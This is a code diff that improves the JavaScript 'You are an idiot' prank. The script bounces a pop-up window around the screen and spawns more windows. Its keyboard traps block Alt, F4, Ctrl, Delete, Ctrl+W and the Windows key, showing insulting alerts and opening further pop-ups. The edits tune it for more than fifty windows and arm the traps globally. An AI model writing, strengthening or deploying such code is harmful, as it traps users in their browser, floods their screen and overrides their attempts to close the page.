@@ -7,21 +7,30 @@ function bookmark() {
   }
 }
 
-// --- Bounce Logic ---
+// --- Bounce Logic (Optimized for 50+ windows) ---
 var flagRun = 1;
 var xOff = 5, yOff = 5, xPos = 400, yPos = -100;
 
 function playBall() {
   if (flagRun != 1) return;
+  
+  // Update position
   xPos += xOff; yPos += yOff;
+  
+  // Bounce off edges
   if (xPos > screen.width - 357) xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
   if (xPos < 0) xOff = Math.ceil(7 * Math.random()) * 5 - 10;
   if (yPos > screen.height - 330) yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
   if (yPos < 0) yOff = Math.ceil(7 * Math.random()) * 5 - 10;
+  
+  // Move the window
   window.moveTo(xPos, yPos);
-  setTimeout('playBall()', 1);
+  
+  // Use requestAnimationFrame instead of setTimeout
+  requestAnimationFrame(playBall);
 }
 
+// --- Pop-up Spawner ---
 function openWindow(url) {
   window.open(url, '_blank', 'menubar=no,status=no,toolbar=no,resizable=no,width=357,height=330,titlebar=no,alwaysRaised=yes');
 }
@@ -33,43 +42,37 @@ function procreate() {
 // --- Master Switch ---
 var prankActive = false;
 
-// --- Keyboard Traps ---
+// --- Keyboard Traps (Armed globally) ---
 function armTraps() {
   if (window.addEventListener) {
     window.addEventListener("keydown", function(event) {
       if (!prankActive) return;
 
-      // Alt (alone)
       if (event.key === "Alt" || event.keyCode === 18) {
         event.preventDefault();
         alert("You are an idiot!");
         procreate();
       }
-      // F4 (alone)
       if (event.key === "F4") {
         event.preventDefault();
         alert("You are an idiot!");
         procreate();
       }
-      // Ctrl (alone)
       if (event.key === "Control" || event.keyCode === 17) {
         event.preventDefault();
         alert("You are an idiot!");
         procreate();
       }
-      // Delete (Del key)
       if (event.key === "Delete" || event.keyCode === 46) {
         event.preventDefault();
         alert("You are an idiot!");
         procreate();
       }
-      // Ctrl+W (Close tab)
       if ((event.ctrlKey && event.key === "w") || (event.ctrlKey && event.key === "W")) {
         event.preventDefault();
         alert("Not even Tux can save you now!");
         procreate();
       }
-      // Windows Key (30 pop-ups)
       if (event.key === "Meta" || event.keyCode === 91 || event.keyCode === 92) {
         event.preventDefault();
         alert("You are an idiot!");
